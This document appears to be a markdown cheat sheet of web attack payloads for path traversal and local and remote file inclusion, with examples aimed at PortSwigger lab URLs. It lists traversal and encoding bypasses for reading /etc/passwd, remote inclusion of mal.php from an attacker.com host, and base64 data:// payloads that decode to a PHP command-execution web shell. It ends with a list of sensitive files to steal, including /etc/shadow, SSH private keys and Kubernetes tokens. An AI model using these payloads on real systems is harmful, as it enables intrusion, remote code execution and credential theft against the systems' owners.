- Simple Path traversal : 
```sh
../../../etc/passwd
```

- Another way: 
```sh
http://Zephir.com/artcile=New_shoes/../../../etc/passwd
```

- You can sometime do a Path traversal thanks to image path like this :
```sh
https://Portswiger.web-security-academy.net/image?filename=9.jpg

https://Portswiger.web-security-academy.net/image?filename=/etc/passwd
```

- Traversal sequences stripped :
```sh
https://Portswiger.web-security-academy.net/image?filename=....//....//....//etc//passwd
```

```sh
....// or ....\/
```

- Double Encoding : 
```sh
https://Portswiger.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 
```

[URL double encoding](https://yolospacehacker.com/en/toolbox.php?id=LFIURLDoubleEncodage)
```
<   %3C %253C
>   %3E %253E
«   %22 %2522
‘   %27 %2527
/   %2F %252F
.   %2E %252E
=   %3D %253D
–   %2D %252D
:   %3A %253A
```

`You can double encode with burpsuite`

- Null Bytes :
```sh
https://Portswiger.web-security-academy.net/image?filename=../../../../etc/passwd%00.png

#Or

https://Portswiger.web-security-academy.net/image?filename=index.php%00
```

- Validation of start of path :
```sh
https://Portswiger.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
```

- Read File with php:filter :
```sh
https://Portswiger.web-security-academy.net/image?filename=php://filter/convert.base64-encode/resource=index.php
```

- RFI:
```sh
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```

- If for some reason `**allow_url_include**` is **On**, but PHP is **filtering** access to external webpages ,you could use for example the data protocol with base64 to decode a b64 PHP code and get RCE:
```sh
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```

or

```sh
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```

- Interesting Linux files
```sh
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/plocate/plocate.db
/var/lib/mlocate.db
```